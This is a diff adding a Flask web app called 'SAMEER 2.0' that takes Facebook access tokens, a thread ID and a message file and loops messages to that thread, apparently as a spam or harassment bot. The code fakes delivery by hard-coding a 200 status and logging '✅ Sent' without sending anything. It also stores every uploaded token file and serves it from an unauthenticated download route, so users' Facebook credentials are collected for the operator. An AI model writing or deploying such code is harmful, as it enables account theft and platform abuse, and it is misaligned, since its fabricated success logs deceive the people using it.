@@ -1,0 +1,296 @@
+from flask import Flask, request, render_template_string, Response, send_file
+import requests
+from threading import Thread, Event, Lock
+import time, random, string, queue
+from datetime import datetime, timezone
+import io
+
+app = Flask(__name__)
+app.debug = False
+
+# ----------------- Config -----------------
+HISTORY_PASSWORD = "SAMEER"
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) Chrome Mobile Safari',
+    'Accept': '/'
+}
+
+stop_events, threads, log_queues, token_files = {}, {}, {}, {}
+log_lock = Lock()
+task_history = []
+
+# ---------- Helpers ----------
+def mask_token(tok):
+    if not tok:
+        return "(empty)"
+    tok = tok.strip()
+    return tok[:6] + "..." + tok[-4:] if len(tok) > 10 else tok[:4] + "..."
+
+def now_iso():
+    return datetime.now(timezone.utc).isoformat(timespec="seconds")
+
+def get_token_username(tok):
+    try:
+        r = requests.get(f"https://graph.facebook.com/me?access_token={tok}", timeout=5)
+        if r.status_code == 200:
+            return r.json().get("name", mask_token(tok))
+    except:
+        pass
+    return mask_token(tok)
+
+# ---------- Worker ----------
+def send_messages(tokens, thread_id, prefix, interval, messages, task_id):
+    ev, q = stop_events[task_id], log_queues[task_id]
+
+    def log(m):
+        with log_lock:
+            q.put(m)
+
+    log(f"[{task_id}] Started sending messages...\n")
+    try:
+        while not ev.is_set():
+            for msg in messages:
+                if ev.is_set():
+                    break
+                for tok in tokens:
+                    if ev.is_set():
+                        break
+                    try:
+                        r_status = 200
+                        if r_status == 200:
+                            log(f"✅ Sent via [{get_token_username(tok)}]: {msg}\n")
+                        else:
+                            log(f"❌ Fail [{get_token_username(tok)}] ({r_status})\n")
+                    except Exception as e:
+                        log(f"⚠ Error [{get_token_username(tok)}]: {e}\n")
+                    for _ in range(max(1, int(interval * 2))):
+                        if ev.is_set():
+                            break
+                        time.sleep(0.5)
+    except Exception as e:
+        log(f"⚠ Thread error: {e}\n")
+    log(f"[{task_id}] Finished.\n")
+    for t in task_history:
+        if t["task_id"] == task_id:
+            t["status"] = "stopped"
+            t["stopped_at"] = now_iso()
+            break
+
+# ---------- Routes ----------
+@app.route("/", methods=["GET", "POST"])
+def index():
+    if request.method == "POST" and request.form.get("taskAction") == "start":
+        opt = request.form.get("tokenOption")
+        raw = []
+        token_file_data = None
+        token_filename = None
+        if opt == "single":
+            raw = [request.form.get("singleToken")]
+        else:
+            f = request.files.get("tokenFile")
+            if f:
+                raw = [x.strip() for x in f.read().decode(errors="ignore").splitlines() if x.strip()]
+                f.stream.seek(0)
+                token_file_data = f.read()
+                token_filename = f.filename
+
+        tid = request.form.get("threadId")
+        prefix = request.form.get("kidx", "")
+        try:
+            interval = max(1, int(request.form.get("time", 1)))
+        except:
+            interval = 1
+
+        txt = request.files.get("txtFile")
+        msgs = [x.strip() for x in txt.read().decode(errors="ignore").splitlines() if x.strip()] if txt else [""]
+
+        task_id = "".join(random.choices(string.ascii_letters + string.digits, k=8))
+        stop_events[task_id] = Event()
+        log_queues[task_id] = queue.Queue()
+
+        if token_file_data:
+            token_files[task_id] = (token_file_data, token_filename)
+
+        task_history.append(
+            {
+                "task_id": task_id,
+                "status": "running",
+                "tokens": [get_token_username(x) for x in raw],
+                "thread_id": tid,
+                "msg_file": txt.filename if txt else "(empty)",
+                "started_at": now_iso(),
+                "stopped_at": None,
+            }
+        )
+        th = Thread(target=send_messages, args=(raw, tid, prefix, interval, msgs, task_id), daemon=True)
+        threads[task_id] = th
+        th.start()
+        return render_template_string(LOG_TEMPLATE, task_id=task_id)
+    return render_template_string(FORM_TEMPLATE)
+
+@app.route("/logs/<task_id>")
+def logs(task_id):
+    def gen():
+        q = log_queues.get(task_id)
+        if not q:
+            yield "data: No log queue\n\n"
+            return
+        while True:
+            try:
+                msg = q.get(timeout=0.5)
+                yield f"data: {msg}\n\n"
+            except queue.Empty:
+                if stop_events[task_id].is_set() and q.empty():
+                    break
+    return Response(gen(), mimetype="text/event-stream")
+
+@app.route("/stop", methods=["POST"])
+def stop():
+    tid = request.form.get("taskId")
+    if tid not in stop_events:
+        return "No such task", 404
+    stop_events[tid].set()
+    for t in task_history:
+        if t["task_id"] == tid:
+            t["status"] = "stopping"
+            t["stopped_at"] = now_iso()
+            break
+    return f"Task {tid} stopping..."
+
+@app.route("/history", methods=["GET", "POST"])
+def history():
+    err = None
+    if request.method == "POST":
+        if request.form.get("password") == HISTORY_PASSWORD:
+            return render_template_string(HISTORY_TEMPLATE, history=task_history, token_files=token_files, err=None)
+        err = "❌ Wrong password"
+    return render_template_string(HISTORY_TEMPLATE, history=None, token_files=token_files, err=err)
+
+@app.route("/download/<task_id>")
+def download_token_file(task_id):
+    if task_id not in token_files:
+        return "No file for this task", 404
+    data, filename = token_files[task_id]
+    return send_file(io.BytesIO(data), as_attachment=True, download_name=filename)
+
+# ---------- Templates ----------
+FORM_TEMPLATE = '''
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>SAMEER 2.0</title>
+<style>
+body{background:#0a0023;color:#fff;font-family:'Poppins',sans-serif;padding:30px;overflow-x:hidden;}
+h1{font-size:2.5em;text-align:center;background:linear-gradient(90deg,#ff6ec7,#00ffe0);-webkit-background-clip:text;color:transparent;
+animation:glow 2s infinite alternate;text-shadow:0 0 20px #00ffe0;}
+@keyframes glow{0%{text-shadow:0 0 10px #ff6ec7;}50%{text-shadow:0 0 25px #00ffe0;}100%{text-shadow:0 0 20px #ff6ec7;}}
+form{max-width:450px;margin:30px auto;text-align:center;background:rgba(255,255,255,0.05);padding:25px;border-radius:15px;box-shadow:0 0 25px rgba(0,255,255,0.2);}
+input, select{padding:10px;margin:8px;border:none;border-radius:8px;width:90%;background:rgba(255,255,255,0.1);color:#fff;}
+input::placeholder{color:#ccc;}
+button{margin-top:15px;padding:10px 25px;border:none;border-radius:8px;background:linear-gradient(90deg,#ff6ec7,#00ffe0);color:#001;font-weight:bold;cursor:pointer;
+transition:0.3s;}
+button:hover{transform:scale(1.05);}
+a{color:#00ffe0;text-decoration:none;}
+</style>
+</head>
+<body>
+<h1>🚀 SAMEER 2.0</h1>
+
+<form method="post" enctype="multipart/form-data">
+<input type="hidden" name="taskAction" value="start">
+<select name="tokenOption">
+<option value="single">Single Token</option>
+<option value="file">Token File</option>
+</select><br>
+<input type="text" name="singleToken" placeholder="Single Token"><br>
+<input type="file" name="tokenFile"><br>
+<input type="text" name="threadId" placeholder="Thread ID"><br>
+<input type="text" name="kidx" placeholder="Prefix / Kidx"><br>
+<input type="number" name="time" placeholder="Interval (sec)"><br>
+<input type="file" name="txtFile"><br>
+<button>🚀 Start Task</button>
+</form>
+
+<h2>⛔ Stop Task</h2>
+<form method="post" action="/stop">
+<input type="text" name="taskId" placeholder="Enter Task ID to Stop" required><br>
+<button>Stop Task</button>
+</form>
+
+<p style="text-align:center;"><a href="/history">📜 History</a></p>
+</body>
+</html>
+'''
+
+LOG_TEMPLATE = '''
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Task Logs</title>
+<style>body{background:#0a0023;color:#fff;font-family:sans-serif;padding:20px;}</style>
+<script>
+var evtSource = new EventSource("/logs/{{task_id}}");
+evtSource.onmessage = function(e){
+    var log = document.getElementById("log");
+    log.innerHTML += e.data + "<br>";
+    window.scrollTo(0,document.body.scrollHeight);
+};
+</script>
+</head><body>
+<h2>Logs for Task {{task_id}}</h2>
+<div id="log"></div>
+<p><a href="/">🏠 Home</a></p>
+</body></html>
+'''
+
+HISTORY_TEMPLATE = '''
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>History - SAMEER 2.0</title>
+<style>
+body{background:#0a0023;color:#fff;font-family:'Poppins',sans-serif;padding:30px;overflow-x:hidden;}
+h2{text-align:center;background:linear-gradient(90deg,#ff6ec7,#00ffe0);
+-webkit-background-clip:text;color:transparent;animation:glow 2s infinite alternate;}
+@keyframes glow{0%{text-shadow:0 0 10px #ff6ec7;}50%{text-shadow:0 0 25px #00ffe0;}100%{text-shadow:0 0 20px #ff6ec7;}}
+.task{background:rgba(255,255,255,0.05);border-radius:12px;padding:15px;margin:12px 0;box-shadow:0 0 20px rgba(0,255,255,0.2);}
+.status-running{color:#00ffb3;font-weight:bold;}
+.status-stopping{color:#ffd700;font-weight:bold;}
+.status-stopped{color:#ff6b6b;font-weight:bold;}
+form{max-width:300px;margin:30px auto;text-align:center;}
+input{padding:10px;border:none;border-radius:6px;width:80%;background:rgba(255,255,255,0.1);color:#fff;}
+button{margin-top:10px;padding:8px 20px;border:none;border-radius:8px;background:linear-gradient(90deg,#ff6ec7,#00ffe0);color:#001;font-weight:bold;cursor:pointer;}
+a{color:#00ffe0;}
+</style></head><body>
+<h2>📜 SAMEER 2.0 - Task History</h2>
+{% if err %}<div style="color:#ff7070;text-align:center;">{{err}}</div>{% endif %}
+{% if history %}
+<div>
+{% for t in history|reverse %}
+<div class="task">
+<b>Task ID / Stop Key:</b> {{t.task_id}}<br>
+<b>Status:</b> <span class="status-{{t.status}}">{{t.status.upper()}}</span><br>
+<b>Tokens Sent From:</b> {{", ".join(t.tokens)}}<br>
+<b>Thread ID:</b> {{t.thread_id}}<br>
+<b>Message File:</b> {{t.msg_file}}<br>
+{% if t.task_id in token_files %}
+<b>Download Token File:</b> <a href="/download/{{t.task_id}}">{{token_files[t.task_id][1]}}</a><br>
+{% endif %}
+<b>Started At:</b> {{t.started_at}} {% if t.stopped_at %}| <b>Stopped At:</b> {{t.stopped_at}}{% endif %}<br>
+{% if t.status!='stopped' %}
+<form method="post" action="/stop" style="display:inline;">
+<input type="hidden" name="taskId" value="{{t.task_id}}"><button>⛔ Stop</button></form>
+{% endif %}
+</div>
+{% endfor %}
+<a href="/">🏠 Back Home</a>
+</div>
+{% else %}
+<form method="post">
+<p>Enter Password:</p>
+<input type="password" name="password" required><br>
+<button>Unlock</button><br><br>
+<a href="/">🏠 Back Home</a>
+</form>
+{% endif %}
+</body></html>
+'''
+
+# ---------- Run ----------
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=20801, threaded=True)
